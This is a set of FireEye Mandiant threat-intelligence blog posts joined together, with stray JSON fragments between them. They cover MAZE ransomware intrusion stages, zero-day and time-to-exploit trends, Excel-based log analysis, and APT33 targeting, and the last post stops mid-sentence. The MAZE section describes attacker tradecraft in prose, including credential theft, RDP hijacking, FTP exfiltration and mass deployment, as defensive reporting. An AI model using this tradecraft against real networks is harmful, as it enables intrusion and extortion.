MAZE ransomware deployment has a section for affiliate transactions. This activity is consistent with our assessment that MAZE operates under an affiliate model and is not distributed by a single group. Under this business model, ransomware developers will partner with other actors (i.e. affiliates) who are responsible for distributing the malware. In these scenarios, when a victim pays the ransom demand, the ransomware developers receive a commission. Direct affiliates of MAZE ransomware also partner with other actors who perform specific tasks for a percentage of the ransom payment. This includes partners who provide initial access to organizations and pentesters who are responsible for reconnaissance, privilege escalation and lateral movement—each of which who appear to work on a percentage-basis. Notably, in some cases, actors may be hired on a salary basis (vs commission) to perform specific tasks such as determining the victim organization and its annual revenues. This allows for specialization within the cyber criminal ecosystem, ultimately increasing efficiency, while still allowing all parties involved to profit. Figure 2: MAZE ransomware panel MAZE Initially Distributed via Exploit Kits and Spam Campaigns MAZE ransomware was initially distributed directly via exploit kits and spam campaigns through late 2019. For example, in November 2019, Mandiant observed multiple email campaigns delivering Maze ransomware primarily to individuals at organizations in Germany and the United States, although a significant number of emails were also delivered to entities in Canada, Italy, and South Korea. These emails used tax, invoice, and package delivery themes with document attachments or inline links to documents which download and execute Maze ransomware. On November 6 and 7, a Maze campaign targeting Germany delivered macro-laden documents using the subject lines “Wichtige informationen uber Steuerruckerstattung” and “1&1 Internet AG - Ihre Rechnung 19340003422 vom 07.11.19” (Figure 3). Recipients included individuals at organizations in a wide range of industries, with the Financial Services, Healthcare, and Manufacturing sectors being targeted most frequently. These emails were sent using a number of malicious domains created with the registrant address gladkoff1991@yandex.ru. Figure 3: German-language lure On November 8, a campaign delivered Maze primarily to Financial Services and Insurance organizations located in the United states. These emails originated from a compromised or spoofed account and contained an inline link to download a Maze executable payload. On November 18 and 19, a Maze campaign targeted individuals operating in a range of industries in the United States and Canada with macro documents using phone bill and package delivery themes (Figure 4 and Figure 5). These emails used the subjects “Missed package delivery” and \"Your AT&T wireless bill is ready to view\" and were sent using a number of malicious domains with the registrant address abusereceive@hitler.rocks. Notably, this registrant address was also used to create multiple Italian-language domains towards the end of November 2019. Figure 4: AT&T email lure Figure 5: Canada Post email lure Shift to Post-Compromise Distribution Maximizes Impact Actors using MAZE have increasingly shifted to deploying the ransomware post-compromise. This methodology provides an opportunity to infect more hosts within a victim’s environment and exfiltrate data, which is leveraged to apply additional pressure on organizations to pay extortion fees. Notably, in at least some cases, the actors behind these operations charge an additional fee, in addition to the decryption key, for the non-release of stolen data. Although the high-level intrusion scenarios preceding the distribution of MAZE ransomware are broadly similar, there have been notable variations across intrusions that suggest attribution to distinct teams. Even within these teams, the cyber criminals appear to be task-oriented meaning that one operator is not responsible for the full lifecycle. The following sections highlight the TTPs seen in a subset of incidents and serve to illustrate the divergence that may occur due to the fact that numerous, disparate actors are involved in different phases of these operations. Notably, the time between initial compromise to encryption has also been widely varied, from weeks to many months. Initial Compromise There are few clear patterns for intrusion vector across analyzed MAZE ransomware incidents. This is consistent with our observations of multiple actors who use MAZE soliciting partners with network access. The following are a sample of observations from several Mandiant incident response engagements: A user downloaded a malicious resume-themed Microsoft Word document that contained macros which launched an IcedID payload, which was ultimately used to execute an instance of BEACON. An actor logged into an internet-facing system via RDP. The account used to grant initial access was a generic support account. It is unclear how the actor obtained the account's password. An actor exploited a misconfiguration on an Internet-facing system. This access enabled the actor to deploy tools to pivot into the internal network. An actor logged into a Citrix web portal account with a weak password. This authenticated access enabled the actor to launch a Meterpreter payload on an internal system. Establish Foothold & Maintain Presence The use of legitimate credentials and broad distribution of BEACON across victim environments appear to be consistent approaches used by actors to establish their foothold in victim networks and to maintain presence as they look to meet their ultimate objective of deploying MAZE ransomware. Despite these commonplace behaviors, we have observed an actor create their own domain account to enable latter-stage operations. Across multiple incidents, threat actors deploying MAZE established a foothold in victim environments by installing BEACON payloads on many servers and workstations. Web shells were deployed to an internet-facing system. The system level access granted by these web shells was used to enable initial privilege escalation and the execution of a backdoor. Intrusion operators regularly obtained and maintained access to multiple domain and local system accounts with varying permissions that were used throughout their operations. An actor created a new domain account and added it to the domain administrators group. Escalate Privileges Although Mandiant has observed multiple cases where MAZE intrusion operators employed Mimikatz to collect credentials to enable privilege escalation, these efforts have also been bolstered in multiple cases via use of Bloodhound, and more manual searches for files containing credentials. Less than two weeks after initial access, the actor downloaded and interacted with an archive named mimi.zip , which contained files corresponding to the credential harvesting tool Mimikatz. In the following days the same mimi.zip archive was identified on two domain controllers in the impacted environment. The actor attempted to find files with the word “password” within the environment. Additionally, several archive files were also created with file names suggestive of credential harvesting activity. The actor attempted to identify hosts running the KeePass password safe software. Across multiple incidents, the Bloodhound utility was used, presumably to assess possible methods of obtaining credentials with domain administrator privileges. Actors primarily used Procdump and Mimikatz to collect credentials used to enable later stages of their intrusion. Notably, both Bloodhound and PingCastle were also used, presumably to enable attackers' efforts to understand the impacted organization's Active Directory configuration. In this case the responsible actors also attempted to exfiltrate collected credentials to multiple different cloud file storage services. Reconnaissance Mandiant has observed a broad range of approaches to network, host, data, and Active Directory reconnaissance across observed MAZE incidents. The varied tools and approaches across these incidents maybe best highlights the divergent ways in which the responsible actors interact with victim networks. In some intrusions, reconnaissance activity occurred within three days of gaining initial access to the victim network. The responsible actor executed a large number of reconnaissance scripts via Cobalt Strike to collect network, host, filesystem, and domain related information. Multiple built-in Windows commands were used to enable network, account, and host reconnaissance of the impacted environment, though the actors also supplied and used Advanced IP Scanner and Adfind to support this stage of their operations. Preliminary network reconnaissance has been conducted using a batch script named '2.bat' which contained a series of nslookup commands. The output of this script was copied into a file named '2.txt'. The actor exfiltrated reconnaissance command output data and documents related to the IT environment to an attacker-controlled FTP server via an encoded PowerShell script. Over a period of several days, an actor conducted reconnaissance activity using Bloodhound, PowerSploit/PowerView (Invoke-ShareFinder), and a reconnaissance script designed to enumerate directories across internal hosts. An actor employed the adfind tool and a batch script to collect information about their network, hosts, domain, and users. The output from this batch script (2adfind.bat) was saved into an archive named 'ad.7z' using an instance of the 7zip archiving utility named 7.exe . An actor used the tool smbtools.exe to assess whether accounts could login to systems across the environment. An actor collected directory listings from file servers across an impacted environment. Evidence of data exfiltration was observed approximately one month later, suggesting that the creation of these directory listings may have been precursor activity, providing the actors with data they may have used to identify sensitive data for future exfiltration. Lateral Movement Across the majority of MAZE ransomware incidents lateral movement was accomplished via Cobalt Strike BEACON and using previously harvested credentials. Despite this uniformity, some alternative tools and approaches were also observed. Attackers relied heavily on Cobalt Strike BEACON to move laterally across the impacted environment, though they also tunneled RDP using the ngrok utility, and employed tscon to hijack legitimate rdp sessions to enable both lateral movement and privilege escalation. The actor moved laterally throughout some networks leveraging compromised service and user accounts obtained from the system on which they gained their initial foothold. This allowed them to obtain immediate access to additional systems. Stolen credentials were then used to move laterally across the network via RDP and to install BEACON payloads providing the actors with access to nearly one hundred hosts. An actor moved laterally using Metasploit and later deployed a Cobalt Strike payload to a system using a local administrator account. At least one actor attempted to perform lateral movement using EternalBlue in early and late 2019; however, there is no evidence that these attempts were successful. Complete Mission There was evidence suggesting data exfiltration across most analyzed MAZE ransomware incidents. While malicious actors could monetize stolen data in various way (e.g. sale in an underground forum, fraud), actors employing MAZE are known to threaten the release of stolen data if victim organizations do not pay an extortion fee. An actor has been observed exfiltrating data to FTP servers using a base64-encoded PowerShell script designed to upload any files with .7z file extensions to a predefined FTP server using a hard-coded username and password. This script appears to be a slight variant of a script first posted to Microsoft TechNet in 2013. A different base64-encoded PowerShell command was also used to enable this functionality in a separate incident. Actors deploying MAZE ransomware have also used the utility WinSCP to exfiltrate data to an attacker-controlled FTP server. An actor has been observed employing a file replication utility and copying the stolen data to a cloud file hosting/sharing service. Prior to deploying MAZE ransomware threat actors employed the 7zip utility to archive data from across various corporate file shares. These archives were then exfiltrated to an attacker-controlled server via FTP using the WinSCP utility. In addition to data theft, actors deploy MAZE ransomware to encrypt files identified on the victim network. Notably, the aforementioned MAZE panel has an option to specify the date on which ransom demands will double, likely to create a sense of urgency to their demands. Five days after data was exfiltrated from a victim environment the actor copied a MAZE ransomware binary to 15 hosts within the victim environment and successfully executed it on a portion of these systems. Attackers employed batch scripts and a series to txt files containing host names to distribute and execute MAZE ransomware on many servers and workstations across the victim environment. An actor deployed MAZE ransomware to tens of hosts, explicitly logging into each system using a domain administrator account created earlier in the intrusion. Immediately following the exfiltration of sensitive data, the actors began deployment of MAZE ransomware to hosts across the network. In some cases, thousands of hosts were ultimately encrypted. The encryption process proceeded as follows: A batch script named start.bat was used to execute a series of secondary batch scripts with names such as xaa3x.bat or xab3x.bat . Each of these batch scripts contained a series of commands that employed the copy command, WMIC, and PsExec to copy and execute a kill script (windows.bat) and an instance of MAZE ransomware (sss.exe) on hosts across the impacted environment Notably, forensic analysis of the impacted environment revealed MAZE deployment scripts targeting ten times as many hosts as were ultimately encrypted. Implications Based on our belief that the MAZE ransomware is distributed by multiple actors, we anticipate that the TTPs used throughout incidents associated with this ransomware will continue to vary somewhat, particularly in terms of the initial intrusion vector.

Future data collection and analysis efforts may reveal additional groups involved in intrusion activity supporting MAZE operations, or may instead allow us to collapse some of these groups into larger clusters. It should also be noted that ‘initial access’ phase techniques have been included in these mappings, though in some cases this access may have been provided by a separate threat actor(s).

                "text": "One of the critical strategic and tactical roles that cyber threat intelligence (CTI) plays is in the tracking, analysis, and prioritization of software vulnerabilities that could potentially put an organization’s data, employees and customers at risk. In this four-part blog series, FireEye Mandiant Threat Intelligence highlights the value of CTI in enabling vulnerability management, and unveils new research into the latest threats, trends and recommendations. FireEye Mandiant Threat Intelligence documented more zero-days exploited in 2019 than any of the previous three years. While not every instance of zero-day exploitation can be attributed to a tracked group, we noted that a wider range of tracked actors appear to have gained access to these capabilities. Furthermore, we noted a significant increase over time in the number of zero-days leveraged by groups suspected to be customers of companies that supply offensive cyber capabilities, as well as an increase in zero-days used against targets in the Middle East, and/or by groups with suspected ties to this region. Going forward, we are likely to see a greater variety of actors using zero-days, especially as private vendors continue feeding the demand for offensive cyber weapons. Zero-Day Usage by Country and Group Since late 2017, FireEye Mandiant Threat Intelligence noted a significant increase in the number of zero-days leveraged by groups that are known or suspected to be customers of private companies that supply offensive cyber tools and services. Additionally, we observed an increase in zero-days leveraged against targets in the Middle East, and/or by groups with suspected ties to this region. Examples include: A group described by researchers as Stealth Falcon and FruityArmor is an espionage group that has reportedly targeted journalists and activists in the Middle East . In 2016, this group used malware sold by NSO group, which leveraged three iOS zero-days. From 2016 to 2019, this group used more zero-days than any other group. The activity dubbed SandCat in open sources, suspected to be linked to Uzbekistan state intelligence , has been observed using zero-days in operations against targets in the Middle East. This group may have acquired their zero-days by purchasing malware from private companies such as NSO group, as the zero-days used in SandCat operations were also used in Stealth Falcon operations, and it is unlikely that these distinct activity sets independently discovered the same three zero-days. Throughout 2016 and 2017, activity referred to in open sources as BlackOasis , which also primarily targets entities in the Middle East and likely acquired at least one zero-day in the past from private company Gamma Group , demonstrated similarly frequent access to zero-day vulnerabilities. We also noted examples of zero-day exploitation that have not been attributed to tracked groups but that appear to have been leveraged in tools provided by private offensive security companies, for instance: In 2019, a zero-day exploit in WhatsApp (CVE-2019-3568) was reportedly used to distribute spyware developed by NSO group, an Israeli software company. FireEye analyzed activity targeting a Russian healthcare organization that leveraged a 2018 Adobe Flash zero-day (CVE-2018-15982) that may be linked to leaked source code of Hacking Team. Android zero-day vulnerability CVE-2019-2215 was reportedly being exploited in the wild in October 2019 by NSO Group tools. Zero-Day Exploitation by Major Cyber Powers We have continued to see exploitation of zero days by espionage groups of major cyber powers. According to researchers, the Chinese espionage group APT3 exploited CVE-2019-0703 in targeted attacks in 2016 . FireEye observed North Korean group APT37 conduct a 2017 campaign that leveraged Adobe Flash vulnerability CVE-2018-4878. This group has also demonstrated an increased capacity to quickly exploit vulnerabilities shortly after they have been disclosed. From December 2017 to January 2018, we observed multiple Chinese groups leveraging CVE-2018-0802 in a campaign targeting multiple industries throughout Europe, Russia, Southeast Asia, and Taiwan. At least three out of six samples were used before the patch for this vulnerability was issued. In 2017, Russian groups APT28 and Turla leveraged multiple zero-days in Microsoft Office products. In addition, we believe that some of the most dangerous state sponsored intrusion sets are increasingly demonstrating the ability to quickly exploit vulnerabilities that have been made public. In multiple cases, groups linked to these countries have been able to weaponize vulnerabilities and incorporate them into their operations, aiming to take advantage of the window between disclosure and patch application. Zero-Day Use by Financially Motivated Actors Financially motivated groups have and continue to leverage zero-days in their operations , though with less frequency than espionage groups. In May 2019, we reported that FIN6 used a Windows server 2019 use-after-free zero-day (CVE-2019-0859) in a targeted intrusion in February 2019. Some evidence suggests that the group may have used the exploit since August 2018. While open sources have suggested that the group potentially acquired the zero-day from criminal underground actor \" BuggiCorp ,\" we have not identified direct evidence linking this actor to this exploit's development or sale. Conclusion We surmise that access to zero-day capabilities is becoming increasingly commodified based on the proportion of zero-days exploited in the wild by suspected customers of private companies. Possible reasons for this include: Private companies are likely creating and supplying a larger proportion of zero-days than they have in the past, resulting in a concentration of zero-day capabilities among highly resourced groups. Private companies may be increasingly providing offensive capabilities to groups with lower overall capability and/or groups with less concern for operational security, which makes it more likely that usage of zero-days will be observed. It is likely that state groups will continue to support internal exploit discovery and development; however, the availability of zero-days through private companies may offer a more attractive option than relying on domestic solutions or underground markets. As a result, we expect that the number of adversaries demonstrating access to these kinds of vulnerabilities will almost certainly increase and will do so at a faster rate than the growth of their overall offensive cyber capabilities—provided they have the ability and will to spend the necessary funds. Register today to hear FireEye Mandiant Threat Intelligence experts discuss the latest in vulnerability threats, trends and recommendations in our upcoming April 30 webinar. Sourcing Note: Some vulnerabilities and zero-days were identified based on FireEye research, Mandiant breach investigation findings, and other technical collections. This paper also references vulnerabilities and zero-days discussed in open sources including Google Project Zero's zero-day \"In the Wild\" Spreadsheet . While we believe these sources are reliable as used in this paper, we do not vouch for the complete findings of those sources. Due to the ongoing discovery of past incidents, we expect that this research will remain dynamic. Subscribe to Blogs Get email updates as new blog posts are added."

In this four-part blog series, FireEye Mandiant Threat Intelligence highlights the value of CTI in enabling vulnerability management, and unveils new research into the latest threats, trends and recommendations. Check out our first post on zero-day vulnerabilities . Attackers are in a constant race to exploit newly discovered vulnerabilities before defenders have a chance to respond. FireEye Mandiant Threat Intelligence research into vulnerabilities exploited in 2018 and 2019 suggests that the majority of exploitation in the wild occurs before patch issuance or within a few days of a patch becoming available. Figure 1: Percentage of vulnerabilities exploited at various times in relation to patch release FireEye Mandiant Threat Intelligence analyzed 60 vulnerabilities that were either exploited or assigned a CVE number between Q1 2018 to Q3 2019. The majority of vulnerabilities were exploited as zero-days – before a patch was available. More than a quarter were exploited within one month after the patch date. Figure 2 illustrates the number of days between when a patch was made available and the first observed exploitation date for each vulnerability. We believe these numbers to be conservative estimates, as we relied on the first reported exploitation of a vulnerability linked to a specific date. Frequently, first exploitation dates are not publicly disclosed. It is also likely that in some cases exploitation occurred without being discovered before researchers recorded exploitation attached to a certain date. Figure 2: Time between vulnerability exploitation and patch issuance ­­­ Time Between Disclosure and Patch Release The average time between disclosure and patch availability was approximately 9 days. This average is slightly inflated by vulnerabilities such as CVE-2019-0863, a Microsoft Windows server vulnerability, which was disclosed in December 2018 and not patched until 5 months later in May 2019. The majority of these vulnerabilities, however, were patched quickly after disclosure. In 59% of cases, a patch was released on the same day the vulnerability was disclosed. These metrics, in combination with the observed swiftness of adversary exploitation activity, highlight the importance of responsible disclosure, as it may provide defenders with the slim window needed to successfully patch vulnerable systems. Exploitation After Patch Release While the majority of the observed vulnerabilities were zero-days, 42 percent of vulnerabilities were exploited after a patch had been released. For these non-zero-day vulnerabilities, there was a very small window (often only hours or a few days) between when the patch was released and the first observed instance of attacker exploitation. Table 1 provides some insight into the race between attackers attempting to exploit vulnerable software and organizations attempting to deploy the patch. Time to Exploit for Vulnerabilities First Exploited after a Patch Hours Two vulnerabilities were successfully exploited within hours of a patch release, CVE-2018-2628 and CVE-2018-7602. Days 12 percent of vulnerabilities were exploited within the first week following the patch release. One Month 15 percent of vulnerabilities were exploited after one week but within one month of patch release. Years In multiple cases, such as the first observed exploitation of CVE-2010-1871 and CVE-2012-0874 in 2019, attackers exploited vulnerabilities for which a patch had been made available many years prior. Table 1: Exploitation timing for patched vulnerabilities ranges from within hours of patch issuance to years after initial disclosure Case Studies We continue to observe espionage and financially motivated groups quickly leveraging publicly disclosed vulnerabilities in their operations. The following examples demonstrate the speed with which sophisticated groups are able to incorporate vulnerabilities into their toolsets following public disclosure and the fact that multiple disparate groups have repeatedly leveraged the same vulnerabilities in independent campaigns. Successful operations by these types of groups are likely to have a high potential impact. Figure 3: Timeline of activity for CVE-2018-15982 CVE-2018-15982: A use after free vulnerability in a file package in Adobe Flash Player 31.0.0.153 and earlier that, when exploited, allows an attacker to remotely execute arbitrary code. This vulnerability was exploited by espionage groups—Russia's APT28 and North Korea's APT37—as well as TEMP.MetaStrike and other financially motivated attackers. Figure 4: Timeline of activity for CVE-2018-20250 CVE-2018-20250: A path traversal vulnerability exists within the ACE format in the archiver tool WinRAR versions 5.61 and earlier that, when exploited, allows an attacker to locally execute arbitrary code. This vulnerability was exploited by multiple espionage groups, including Chinese, North Korean, and Russian, groups, as well as Iranian groups APT33 and TEMP.Zagros. Figure 5: Timeline of Activity for CVE-2018-4878 CVE-2018-4878: A use after free vulnerability exists within the DRMManager’s “initialize” call in Adobe Flash Player 28.0.0.137 and earlier that, when exploited, allows an attacker to remotely execute arbitrary code. Mandiant Intelligence confirmed that North Korea’s APT37 exploited this vulnerability as a zero-day as early as September 3, 2017. Within 8 days of disclosure, we observed Russia’s APT28 also leverage this vulnerability, with financially motivated attackers and North Korea’s TEMP.Hermit also using within approximately a month of disclosure. Availability of PoC or Exploit Code The availability of POC or exploit code on its own does not always increase the probability or speed of exploitation. However, we believe that POC code likely hastens exploitation attempts for vulnerabilities that do not require user interaction. For vulnerabilities that have already been exploited, the subsequent introduction of publicly available exploit or POC code indicates malicious actor interest and makes exploitation accessible to a wider range of attackers. There were a number of cases in which certain vulnerabilities were exploited on a large scale within 48 hours of PoC or exploit code availability (Table 2). Time Between PoC or Exploit Code Publication and First Observed Potential Exploitation Events Product CVE FireEye Risk Rating 1 day WinRAR CVE-2018-20250 Medium 1 day Drupal CVE-2018-7600 High 1 day Cisco Adaptive Security Appliance CVE-2018-0296 Medium 2 days Apache Struts CVE-2018-11776 High 2 days Cisco Adaptive Security Appliance CVE-2018-0101 High 2 days Oracle WebLogic Server CVE-2018-2893 High 2 days Microsoft Windows Server CVE-2018-8440 Medium 2 days Drupal CVE-2019-6340 Medium 2 days Atlassian Confluence CVE-2019-3396 High Table 2: Vulnerabilities exploited within two days of either PoC or exploit code being made publicly available, Q1 2018–Q3 2019 Trends by Targeted Products FireEye judges that malicious actors are likely to most frequently leverage vulnerabilities based on a variety of factors that influence the utility of different vulnerabilities to their specific operations. For instance, we believe that attackers are most likely to target the most widely used products (see Figure 6). Attackers almost certainly also consider the cost and availability of an exploit for a specific vulnerability, the perceived success rate based on the delivery method, security measures introduced by vendors, and user awareness around certain products. The majority of observed vulnerabilities were for Microsoft products, likely due to the ubiquity of Microsoft offerings. In particular, vulnerabilities in software such as Microsoft Office Suite may be appealing to malicious actors based on the utility of email attached documents as initial infection vectors in phishing campaigns. Figure 6: Exploited vulnerabilities by vendor, Q1 2018–Q3 2019 Outlook and Implications The speed with which attackers exploit patched vulnerabilities emphasizes the importance of patching as quickly as possible. With the sheer quantity of vulnerabilities disclosed each year, however, it can be difficult for organizations with limited resources and business constraints to implement an effective strategy for prioritizing the most dangerous vulnerabilities. In upcoming blog posts, FireEye Mandiant Threat Intelligence describes our approach to vulnerability risk rating as well as strategies for making informed and realistic patch management decisions in more detail. We recommend using this exploitation trend information to better prioritize patching schedules in combination with other factors, such as known active threats to an organization's industry and geopolitical context, the availability of exploit and PoC code, commonly impacted vendors, and how widely software is deployed in an organization's environment may help to mitigate the risk of a large portion of malicious activity.

                "text": "In December 2019, we published a blog post on augmenting analysis using Microsoft Excel for various data sets for incident response investigations. As we described, investigations often include custom or proprietary log formats and miscellaneous, non-traditional forensic artifacts. There are, of course, a variety of ways to tackle this task, but Excel stands out as a reliable way to analyze and transform a majority of data sets we encounter. In our first post, we discussed summarizing verbose artifacts using the CONCAT function, converting timestamps using the TIME function, and using the COUNTIF function for log baselining. In this post, we will cover two additional versatile features of Excel: LOOKUP functions and PivotTables. For this scenario, we will use a dataset of logon events for an example Microsoft Office 365 (O365) instance to demonstrate how an analyst can enrich information in the dataset. Then we will demonstrate some examples of how to use PivotTables to summarize information and highlight anomalies in the data quickly. Our data contains the following columns: Description – Event description User – User’s name User Principle Name – email address App – such as Office 365, Sharepoint, etc. Location – Country Date IP address User agent (simplified) Organization – associated with IP address (as identified by O365) Figure 1: O365 data set LOOKUP for Data Enrichment It may be useful to add more information to the data that could help us in analysis that isn’t provided by the original log source. A step FireEye Mandiant often performs during investigations is to take all unique IP addresses and query threat intelligence sources for each IP address for reputation, WHOIS information, connections to known threat actor activity, etc. This grants more information about each IP address that we can take into consideration in our analysis. While FireEye Mandiant is privy to historical engagement data and Mandiant Threat Intelligence , if security teams or organizations do not have access to commercial threat intelligence feeds, there are numerous open source intelligence services that can be leveraged. We can also use IP address geolocation services to obtain latitude and longitude related to each source IP address. This information may be useful in identifying anomalous logons based on geographical location. After taking all source IP addresses, running them against threat intelligence feeds and geolocating them, we have the following data added to a second sheet called “IP Address Intel” in our Excel document: Figure 2: IP address enrichment We can already see before we even dive into the logs themselves that we have suspicious activity: The five IP addresses in the 203.0.113.0/24 range in our data are known to be associated with activity connected to a fictional threat actor tracked as TMP.OGRE. To enrich our original dataset, we will add three columns to our data to integrate the supplementary information: “Latitude,” “Longitude,” and “Threat Intel” (Figure 3). We can use the VLOOKUP or XLOOKUP functions to quickly retrieve the supplementary data and integrate it into our main O365 log sheet. Figure 3: Enrichment columns VLOOKUP The traditional way to look up particular data in another array is by using the VLOOKUP function . We will use the following formula to reference the “Latitude” values for a given IP address: Figure 4: VLOOKUP formula for Latitude There are four parts to this formula: Value to look up: This dictates what cell value we are going to look up more information for. In this case, it is cell G2, which is the IP address. Table array: This defines the entire array in which we will look up our value and return data from. The first column in the array must contain the value being looked up. In the aforementioned example, we are searching in ‘IP Address Intel’!$A$2:$D:$15. In other words, we are looking in the other sheet in this workbook we created earlier titled “IP Address Intel”, then in that sheet, search in the cell range of A2 to D15. Figure 5: VLOOKUP table array Note the use of the “$” to ensure these are absolute references and will not be updated by Excel if we copy this formula to other cells. Column index number: This identifies the column number from which to return data. The first column is considered column 1. We want to return the “Latitude” value for the given IP address, so in the aforementioned example, we tell Excel to return data from column 2. Range lookup (match type) This part of the formula tells Excel what type of matching to perform on the value being looked up. Excel defaults to “Approximate” matching, which assumes the data is sorted and will match the closest value. We want to perform “Exact” matching, so we put “0” here (“FALSE” is also accepted). With the VLOOKUP function complete for the “Latitude” data, we can use the fill handle to update this field for the rest of the data set. To get the values for the “Longitude” and “Threat Intel” columns, we repeat the process by using a similar function and, adjusting the column index number to reference the appropriate columns, then use the fill handle to fill in the rest of the column in our O365 data sheet: For Longitude: =VLOOKUP(G2,'IP Address Intel'!$A$2:$D$15, 3 ,0) For Threat Intel: =VLOOKUP(G2,'IP Address Intel'!$A$2:$D$15, 4 ,0) Bonus Option: XLOOKUP The XLOOKUP function in Excel is a more efficient way to reference the threat intelligence data sheet. XLOOKUP is a newer function introduced to Excel to replace the legacy VLOOKUP function and, at the time of writing this post, is only available to “O365 subscribers in the Monthly channel”, according to Microsoft. In this instance, we will also leverage Excel’s dynamic arrays and “spilling” to fill in this data more efficiently, instead of making an XLOOKUP function for each column. NOTE: To utilize dynamic arrays and spilling, the data we are seeking to enrich cannot be in the form of a “Table” object. Instead, we will apply filters to the top row of our O365 data set by selecting the “Filter” option under “Sort & Filter” in the “Home” ribbon: Figure 6: Filter option To reference the threat intelligence data sheet using XLOOKUP, we will use the following formula: Figure 7: XLOOKUP function for enrichment There are three parts to this XLOOKUP formula: Value to lookup: This dictates what cell value we are going to look up more information for. In this case, it is cell G2, which is the IP address. Array to look in: This will be the array of data in which Excel will search for the value to look up. Excel does exact matching by default for XLOOKUP. In the aforementioned example, we are searching in ‘IP Address Intel’!$A$2:$A:$15. In other words, we are looking in the other sheet in this workbook titled “IP Address Intel”, then in that sheet, search in the cell range of A2 to A15: Figure 8: XLOOKUP array to look in Note the use of the “$” to ensure these are absolute references and will not be updated by Excel if we copy this formula to other cells. Array of data to return: This part will be the array of data from which Excel will return data. In this case, Excel will return the data contained within the absolute range of B2 to D15 from the “IP Address Intel” sheet for the value that was looked up. In the aforementioned example formula, it will return the values in the row for the IP address 198.51.100.126: Figure 9: Data to be returned from ‘IP Address Intel’ sheet Because this is leveraging dynamic arrays and spilling, all three cells of the returned data will populate, as seen in Figure 4. Now that our dataset is completely enriched by either using VLOOKUP or XLOOKUP, we can start hunting for anomalous activity. As a quick first step, since we know at least a handful of IP addresses are potentially malicious, we can filter on the “Threat Intel” column for all rows that match “TMP.OGRE” and reveal logons with source IP addresses related to known threat actors. Now we have timeframes and suspected compromised accounts to pivot off of for additional hunting through other data. PIVOT! PIVOT! PIVOT! One of the most useful tools for highlighting anomalies by summarizing data, performing frequency analysis and quickly obtaining other statistics about a given dataset is Excel’s PivotTable function . Location Anomalies Let’s utilize a PivotTable to perform frequency analysis on the location from which users logged in. This type of technique may highlight activity where a user account logged in from a location which is unusual for them. To create a PivotTable for our data, we can select any cell in our O365 data and select the entire range with Ctrl+A. Then, under the “Insert” tab in the ribbon, select “PivotTable”: Figure 10: PivotTable selection This will bring up a window, as seen in Figure 11, to confirm the data for which we want to make a PivotTable (Step 1 in Figure 11). Since we selected our O365 log data set with Ctrl+A, this should be automatically populated. It will also ask where we want to put the PivotTable (Step 2 in Figure 11). In this instance, we created another sheet called “PivotTable 1” to place the PivotTable: Figure 11: PivotTable creation Now that the PivotTable is created, we must select how we want to populate the PivotTable using our data. Remember, we are trying to determine the locations from which all users logged in. We will want a row for each user and a sub-row for each location the user has logged in from. Let’s add a count of how many times they logged in from each location as well. We will use the “Date” field to do this for this example: Figure 12: PivotTable field definitions Examining this table, we can immediately see there are two users with source location anomalies: Ginger Breadman and William Brody have a small number of logons from “FarFarAway”, which is abnormal for these users based on this data set. We can add more data to this PivotTable to get a timeframe of this suspicious activity by adding two more “Date” fields to the “Values” area. Excel defaults to “Count” of whatever field we drop in this area, but we will change this to the “Minimum” and “Maximum” values by using the “Value Field Settings”, as seen in Figure 13. Figure 13: Adding min and max dates Now we have a PivotTable that shows us anomalous locations for logons, as well as the timeframe in which the logons occurred, so we can hone our investigation. For this example, we also formatted all cells with timestamp values to reflect the format FireEye Mandiant typically uses during analysis by selecting all the appropriate cells, right-clicking and choosing “Format Cells”, and using a “Custom” format of “YYYY-MM-DD HH:MM:SS”. Figure 14: PivotTable with suspicious locations and timeframe IP Address Anomalies Geolocation anomalies may not always be valuable. However, using a similar configuration as the previous example, we can identify suspicious source IP addresses. We will add “User Principle Name” and “IP Address” fields as Rows, and “IP Address” as Values. Let’s also add the “App” field to Columns. Our field settings and resulting table are displayed in Figure 15: Figure 15: PivotTable with IP addresses and apps With just a few clicks, we have a summarized table indicating which IP addresses each user logged in from, and which app they logged into. We can quickly identify two users logged in from IP addresses in the 203.0.113.0/24 range six times, and which applications they logged into from each of these IP addresses. While these are just a couple use cases, there are many ways to format and view evidence using PivotTables. We recommend trying PivotTables on any data set being reviewed with Excel and experimenting with the Rows, Columns, and Values parameters. We also recommend adjusting the PivotTable options , which can help reformat the table itself into a format that might fit requirements. Conclusion These Excel functions are used frequently during investigations at FireEye Mandiant and are considered important forensic analysis techniques. The examples we give here are just a glimpse into the utility of LOOKUP functions and PivotTables. LOOKUP functions can be used to reference a multitude of data sources and can be applied in other situations during investigations such as tracking remediation and analysis efforts. PivotTables may be used in a variety of ways as well, depending on what data is available, and what sort of information is being analyzed to identify suspicious activity. Employing these techniques, alongside the ones we highlighted previously, on a consistent basis will go a long way in \"excelerating\" forensic analysis skills and efficiency.

                "text": "When discussing suspected Middle Eastern hacker groups with destructive capabilities, many automatically think of the suspected Iranian group that previously used SHAMOON – aka Disttrack – to target organizations in the Persian Gulf. However, over the past few years, we have been tracking a separate, less widely known suspected Iranian group with potential destructive capabilities, whom we call APT33. Our analysis reveals that APT33 is a capable group that has carried out cyber espionage operations since at least 2013. We assess APT33 works at the behest of the Iranian government. Recent investigations by FireEye’s Mandiant incident response consultants combined with FireEye iSIGHT Threat Intelligence analysis have given us a more complete picture of APT33’s operations, capabilities, and potential motivations. This blog highlights some of our analysis. Our detailed report on FireEye Threat Intelligence contains a more thorough review of our supporting evidence and analysis. We will also be discussing this threat group further during our webinar on Sept. 21 at 8 a.m. ET. Targeting APT33 has targeted organizations – spanning multiple industries – headquartered in the United States, Saudi Arabia and South Korea. APT33 has shown particular interest in organizations in the aviation sector involved in both military and commercial capacities, as well as organizations in the energy sector with ties to petrochemical production. From mid-2016 through early 2017, APT33 compromised a U.S. organization in the aerospace sector and targeted a business conglomerate located in Saudi Arabia with aviation holdings. During the same time period, APT33 also targeted a South Korean company involved in oil refining and petrochemicals. More recently, in May 2017, APT33 appeared to target a Saudi organization and a South Korean business conglomerate using a malicious file that attempted to entice victims with job vacancies for a Saudi Arabian petrochemical company. We assess the targeting of multiple companies with aviation-related partnerships to Saudi Arabia indicates that APT33 may possibly be looking to gain insights on Saudi Arabia’s military aviation capabilities to enhance Iran’s domestic aviation capabilities or to support Iran’s military and strategic decision making vis a vis Saudi Arabia. We believe the targeting of the Saudi organization may have been an attempt to gain insight into regional rivals, while the targeting of South Korean companies may be due to South Korea’s recent partnerships with Iran’s petrochemical industry as well as South Korea’s relationships with Saudi petrochemical companies. Iran has expressed interest in growing their petrochemical industry and often posited this expansion in competition to Saudi petrochemical companies. APT33 may have targeted these organizations as a result of 